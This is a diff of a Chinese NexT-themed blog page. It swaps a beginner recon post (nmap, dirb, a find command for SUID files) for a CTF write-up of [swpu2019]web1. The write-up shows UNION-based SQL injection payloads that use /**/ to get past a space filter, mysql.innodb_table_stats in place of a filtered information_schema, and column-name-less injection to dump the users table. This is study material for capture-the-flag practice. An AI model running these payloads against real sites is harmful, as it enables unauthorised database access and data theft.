@@ -20,28 +20,36 @@
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
-<meta name="description" content="对于一个给定对应IP地址的靶场机器挖掘开放服务信息为了得到靶场开放服务和服务版可使用1$nmap -sV +IP 为了得到靶场全部信息1$nmap -A -v+IP 对开放http的服务用浏览器访问1$nmap -o+IP 探索该服务的隐藏文件1$dirb http&#x2F;&#x2F;***&#x2F; 查找具有权限root的文件1$find &#x2F; -perm -4000 2&gt;&#x2F;dev&#x2F;null">
+<meta name="description" content="sql注入之无名注入在我们进行sql注入的时候，有时候information_schema这个库可能会因为过滤而无法调用，这时我们就不能通过这个库来查出表名和列名。不过我们可以通过两种方法来查出表名： InnoDb引擎从MYSQL5.5.8开始，InnoDB成为其默认存储引擎。而在MYSQL5.6以上的版本中，inndb增加了innodb_index_stats和innodb_table_stat">
 <meta property="og:type" content="article">
-<meta property="og:title" content="“菜鸟笔记1号”">
-<meta property="og:url" content="http://example.com/2021/09/19/%E2%80%9C%E8%8F%9C%E9%B8%9F%E7%AC%94%E8%AE%B01%E5%8F%B7%E2%80%9D/index.html">
+<meta property="og:title" content="无列名注入">
+<meta property="og:url" content="http://example.com/2021/11/14/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="wds">
-<meta property="og:description" content="对于一个给定对应IP地址的靶场机器挖掘开放服务信息为了得到靶场开放服务和服务版可使用1$nmap -sV +IP 为了得到靶场全部信息1$nmap -A -v+IP 对开放http的服务用浏览器访问1$nmap -o+IP 探索该服务的隐藏文件1$dirb http&#x2F;&#x2F;***&#x2F; 查找具有权限root的文件1$find &#x2F; -perm -4000 2&gt;&#x2F;dev&#x2F;null">
+<meta property="og:description" content="sql注入之无名注入在我们进行sql注入的时候，有时候information_schema这个库可能会因为过滤而无法调用，这时我们就不能通过这个库来查出表名和列名。不过我们可以通过两种方法来查出表名： InnoDb引擎从MYSQL5.5.8开始，InnoDB成为其默认存储引擎。而在MYSQL5.6以上的版本中，inndb增加了innodb_index_stats和innodb_table_stat">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2021-09-19T05:24:27.000Z">
-<meta property="article:modified_time" content="2021-10-25T15:43:41.658Z">
+<meta property="og:image" content="https://i.loli.net/2021/11/14/Zke9TQvxtF2W4mg.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/14/vIu7FfEXd65pyJQ.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/14/pw2KetuCxYDmOL7.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/14/B3xUqzE9JAVnvfl.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/14/7n9YZdX4VzyxeaA.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/16/kJuyev3L5zHcio8.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/16/siyhoeba1frqQL3.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/16/Nbk9mvRZyiJg5t6.png">
+<meta property="article:published_time" content="2021-11-14T13:04:50.000Z">
+<meta property="article:modified_time" content="2021-11-16T14:27:38.261Z">
 <meta property="article:author" content="发福的小菜狗">
-<meta property="article:tag" content="非常高兴能在b站上找到这么多的“ctf教程”，感谢那些无偿的“搬运姬们”，现在开始学习啦！">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/11/14/Zke9TQvxtF2W4mg.png">
 
 
-<link rel="canonical" href="http://example.com/2021/09/19/%E2%80%9C%E8%8F%9C%E9%B8%9F%E7%AC%94%E8%AE%B01%E5%8F%B7%E2%80%9D/">
+<link rel="canonical" href="http://example.com/2021/11/14/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2021/09/19/%E2%80%9C%E8%8F%9C%E9%B8%9F%E7%AC%94%E8%AE%B01%E5%8F%B7%E2%80%9D/","path":"2021/09/19/“菜鸟笔记1号”/","title":"“菜鸟笔记1号”"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2021/11/14/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/","path":"2021/11/14/无列名注入/","title":"无列名注入"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>“菜鸟笔记1号” | wds</title>
+<title>无列名注入 | wds</title>
   
 
 
@@ -120,7 +128,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%B9%E4%BA%8E%E4%B8%80%E4%B8%AA%E7%BB%99%E5%AE%9A%E5%AF%B9%E5%BA%94IP%E5%9C%B0%E5%9D%80%E7%9A%84%E9%9D%B6%E5%9C%BA%E6%9C%BA%E5%99%A8%E6%8C%96%E6%8E%98%E5%BC%80%E6%94%BE%E6%9C%8D%E5%8A%A1%E4%BF%A1%E6%81%AF"><span class="nav-number">1.</span> <span class="nav-text">对于一个给定对应IP地址的靶场机器挖掘开放服务信息</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E4%BA%86%E5%BE%97%E5%88%B0%E9%9D%B6%E5%9C%BA%E5%BC%80%E6%94%BE%E6%9C%8D%E5%8A%A1%E5%92%8C%E6%9C%8D%E5%8A%A1%E7%89%88%E5%8F%AF%E4%BD%BF%E7%94%A8"><span class="nav-number">1.1.</span> <span class="nav-text">为了得到靶场开放服务和服务版可使用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E4%BA%86%E5%BE%97%E5%88%B0%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%83%A8%E4%BF%A1%E6%81%AF"><span class="nav-number">1.2.</span> <span class="nav-text">为了得到靶场全部信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%B9%E5%BC%80%E6%94%BEhttp%E7%9A%84%E6%9C%8D%E5%8A%A1%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%AE%BF%E9%97%AE"><span class="nav-number">1.3.</span> <span class="nav-text">对开放http的服务用浏览器访问</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8E%A2%E7%B4%A2%E8%AF%A5%E6%9C%8D%E5%8A%A1%E7%9A%84%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6"><span class="nav-number">1.4.</span> <span class="nav-text">探索该服务的隐藏文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E6%89%BE%E5%85%B7%E6%9C%89%E6%9D%83%E9%99%90root%E7%9A%84%E6%96%87%E4%BB%B6"><span class="nav-number">1.5.</span> <span class="nav-text">查找具有权限root的文件</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%97%A0%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">sql注入之无名注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">二次注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#swpu2019-web1"><span class="nav-number">3.</span> <span class="nav-text">[swpu2019]web1</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -183,7 +191,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/09/19/%E2%80%9C%E8%8F%9C%E9%B8%9F%E7%AC%94%E8%AE%B01%E5%8F%B7%E2%80%9D/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/14/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -196,7 +204,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          “菜鸟笔记1号”
+          无列名注入
         </h1>
 
         <div class="post-meta-container">
@@ -207,14 +215,14 @@
       </span>
       <span class="post-meta-item-text">Posted on</span>
 
-      <time title="Created: 2021-09-19 13:24:27" itemprop="dateCreated datePublished" datetime="2021-09-19T13:24:27+08:00">2021-09-19</time>
+      <time title="Created: 2021-11-14 21:04:50" itemprop="dateCreated datePublished" datetime="2021-11-14T21:04:50+08:00">2021-11-14</time>
     </span>
       <span class="post-meta-item">
         <span class="post-meta-item-icon">
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2021-10-25 23:43:41" itemprop="dateModified" datetime="2021-10-25T23:43:41+08:00">2021-10-25</time>
+        <time title="Modified: 2021-11-16 22:27:38" itemprop="dateModified" datetime="2021-11-16T22:27:38+08:00">2021-11-16</time>
       </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -222,7 +230,7 @@
       </span>
       <span class="post-meta-item-text">In</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E5%B8%B8%E8%AF%86/" itemprop="url" rel="index"><span itemprop="name">常识</span></a>
+          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
         </span>
     </span>
 
@@ -236,12 +244,35 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h2 id="对于一个给定对应IP地址的靶场机器挖掘开放服务信息"><a href="#对于一个给定对应IP地址的靶场机器挖掘开放服务信息" class="headerlink" title="对于一个给定对应IP地址的靶场机器挖掘开放服务信息"></a>对于一个给定对应IP地址的靶场机器挖掘开放服务信息</h2><h3 id="为了得到靶场开放服务和服务版可使用"><a href="#为了得到靶场开放服务和服务版可使用" class="headerlink" title="为了得到靶场开放服务和服务版可使用"></a>为了得到靶场开放服务和服务版可使用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$nmap</span> -sV +IP</span><br></pre></td></tr></table></figure>
-<h3 id="为了得到靶场全部信息"><a href="#为了得到靶场全部信息" class="headerlink" title="为了得到靶场全部信息"></a>为了得到靶场全部信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$nmap</span> -A -v+IP</span><br></pre></td></tr></table></figure>
-<h3 id="对开放http的服务用浏览器访问"><a href="#对开放http的服务用浏览器访问" class="headerlink" title="对开放http的服务用浏览器访问"></a>对开放http的服务用浏览器访问</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$nmap</span> -o+IP</span><br></pre></td></tr></table></figure>
-<h3 id="探索该服务的隐藏文件"><a href="#探索该服务的隐藏文件" class="headerlink" title="探索该服务的隐藏文件"></a>探索该服务的隐藏文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$dirb</span> http//***/</span><br></pre></td></tr></table></figure>
-<h3 id="查找具有权限root的文件"><a href="#查找具有权限root的文件" class="headerlink" title="查找具有权限root的文件"></a>查找具有权限root的文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$find</span> / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-<hr>
+        <h1 id="sql注入之无名注入"><a href="#sql注入之无名注入" class="headerlink" title="sql注入之无名注入"></a>sql注入之无名注入</h1><p>在我们进行sql注入的时候，有时候information_schema这个库可能会因为过滤而无法调用，这时我们就不能通过这个库来查出表名和列名。不过我们可以通过两种方法来查出表名：</p>
+<p>InnoDb引擎<br>从MYSQL5.5.8开始，InnoDB成为其默认存储引擎。而在MYSQL5.6以上的版本中，inndb增加了innodb_index_stats和innodb_table_stats两张表，这两张表中都存储了数据库和其数据表的信息，但是没有存储列名。<br>sys数据库<br>在5.7以上的MYSQL中，新增了sys数据库，该库的基础数据来自information_schema和performance_chema，其本身不存储数据。可以通过其中的schema_auto_increment_columns来获取表名。<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46330722/article/details/109605941">文章截取csdn</a></p>
+<h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><p>指已经被存入数据库的值被误解读为错误指令。</p>
+<p>一般出现在读取值的过程中有各种过滤，然后对读取数据库时不进行过滤或转义。</p>
+<h1 id="swpu2019-web1"><a href="#swpu2019-web1" class="headerlink" title="[swpu2019]web1"></a>[swpu2019]web1</h1><p>先注册账号</p>
+<p>然后就可以上传广告（上传广告就是把值存入数据库）</p>
+<p>然后分别测试在广告名和广告内容注入，发现广告名可以注入，但是有很多的过滤。</p>
+<p><img src="https://i.loli.net/2021/11/14/Zke9TQvxtF2W4mg.png" alt="QQ截图20211114220531.png"></p>
+<p>用/**/来代替空格，利用union select 查出字段数和回显</p>
+<p><img src="https://i.loli.net/2021/11/14/vIu7FfEXd65pyJQ.png" alt="QQ截图20211114222329.png"></p>
+<p>发现2，3位置回显，</p>
+<p><img src="https://i.loli.net/2021/11/14/pw2KetuCxYDmOL7.png" alt="QQ截图20211114222514.png"></p>
+<p>查库</p>
+<p><img src="https://i.loli.net/2021/11/14/B3xUqzE9JAVnvfl.png" alt="QQ截图20211114223621.png"></p>
+<p>查表（出现没有）</p>
+<p><img src="https://i.loli.net/2021/11/14/7n9YZdX4VzyxeaA.png" alt="QQ截图20211114223712.png"></p>
+<p>-1’union/<strong>/select/</strong>/1,2,group_concat(table_name)/<strong>/from/</strong>/information_schema.tables/<strong>/where/</strong>/table.schema=database(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;’1’=’1</p>
+<p>这里的information_schema被过滤了不能用，所以我们要换一个库来查table_name和column_name</p>
+<p>-1’union/<strong>/select/</strong>/1,2,group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/<strong>/from/</strong>/mysql.innodb_table_stats/<strong>/where/</strong>/database_name=database()&amp;&amp;’1’=’1</p>
+<p>但是这个引擎没有存列名</p>
+<p>所以要利用无列名注入。</p>
+<p>-1’union/<strong>/select/</strong>/1,2,group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/<strong>/from/</strong>/mysql.innodb_table_stats/<strong>/where/</strong>/database_name=database()&amp;&amp;’1’=’1</p>
+<p>用mysql.innodb_table_stats代替information_schema.tables查出表</p>
+<p><img src="https://i.loli.net/2021/11/16/kJuyev3L5zHcio8.png" alt="QQ截图20211116221604.png"></p>
+<p>-1’/<strong>/union/</strong>/select/<strong>/1,(select/</strong>/group_concat(<code>2</code>)/<strong>/from/</strong>/(select/<strong>/1,2,3/</strong>/union/<strong>/select*from/</strong>/users)n),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;’1’=’1</p>
+<p><img src="https://i.loli.net/2021/11/16/siyhoeba1frqQL3.png" alt="QQ截图20211116222056.png"></p>
+<p>查询</p>
+<p>-1’/<strong>/union/</strong>/select/<strong>/1,(select/</strong>/group_concat(<code>3</code>)/<strong>/from/</strong>/(select/<strong>/1,2,3/</strong>/union/<strong>/select*from/</strong>/users)n),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;’1’=’1’</p>
+<p><img src="https://i.loli.net/2021/11/16/Nbk9mvRZyiJg5t6.png" alt="QQ截图20211116222453.png"></p>
 
     </div>
 
@@ -250,22 +281,16 @@
     
 
     <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/%E9%9D%9E%E5%B8%B8%E9%AB%98%E5%85%B4%E8%83%BD%E5%9C%A8b%E7%AB%99%E4%B8%8A%E6%89%BE%E5%88%B0%E8%BF%99%E4%B9%88%E5%A4%9A%E7%9A%84%E2%80%9Cctf%E6%95%99%E7%A8%8B%E2%80%9D%EF%BC%8C%E6%84%9F%E8%B0%A2%E9%82%A3%E4%BA%9B%E6%97%A0%E5%81%BF%E7%9A%84%E2%80%9C%E6%90%AC%E8%BF%90%E5%A7%AC%E4%BB%AC%E2%80%9D%EF%BC%8C%E7%8E%B0%E5%9C%A8%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0%E5%95%A6%EF%BC%81/" rel="tag"># 非常高兴能在b站上找到这么多的“ctf教程”，感谢那些无偿的“搬运姬们”，现在开始学习啦！</a>
-          </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2021/09/18/The-First-Day/" rel="prev" title="The First Day">
-                  <i class="fa fa-chevron-left"></i> The First Day
+                <a href="/2021/11/10/less17/" rel="prev" title="less17-">
+                  <i class="fa fa-chevron-left"></i> less17-
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2021/09/26/%E2%80%9C%E5%86%B7%E7%9F%A5%E8%AF%86%E2%80%9D/" rel="next" title="“冷知识”">
-                  “冷知识” <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
     </footer>
